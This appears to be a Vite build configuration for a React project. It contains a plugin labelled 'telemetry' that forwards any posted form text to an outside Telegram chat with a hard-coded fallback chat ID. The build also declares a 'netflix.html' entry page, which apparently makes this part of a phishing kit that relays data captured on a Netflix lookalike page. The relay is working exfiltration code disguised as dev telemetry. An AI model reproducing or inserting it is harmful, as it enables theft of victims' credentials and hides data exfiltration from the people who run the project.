import { resolve } from 'path';
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

function telemetryDevPlugin() {
  return {
    name: 'telemetry-dev-proxy',
    configureServer(server) {
      server.middlewares.use('/api/telemetry', (req, res) => {
        if (req.method === 'POST') {
          let body = '';
          req.on('data', chunk => { body += chunk; });
          req.on('end', async () => {
            res.setHeader('Content-Type', 'application/json');
            try {
              const data = JSON.parse(body);
              const token = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN;
              const chatId = process.env.TELEGRAM_CHAT_ID || '6290094136';
              if (token) {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: data.html || data.text || 'Dev Ping',
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                  })
                });
              }
              res.end(JSON.stringify({ ok: true, dev: true }));
            } catch (err) {
              res.end(JSON.stringify({ ok: false, error: err.message }));
            }
          });
        } else {
          res.end(JSON.stringify({ ok: true }));
        }
      });
    }
  };
}

export default defineConfig({
  base: './',
  plugins: [react(), telemetryDevPlugin()],
  build: {
    rollupOptions: {
      input: {
        main: resolve(__dirname, 'index.html'),
        netflix: resolve(__dirname, 'netflix.html')
      }
    }
  },
  server: {
    port: 3000,
    open: false,
    host: true
  }
});
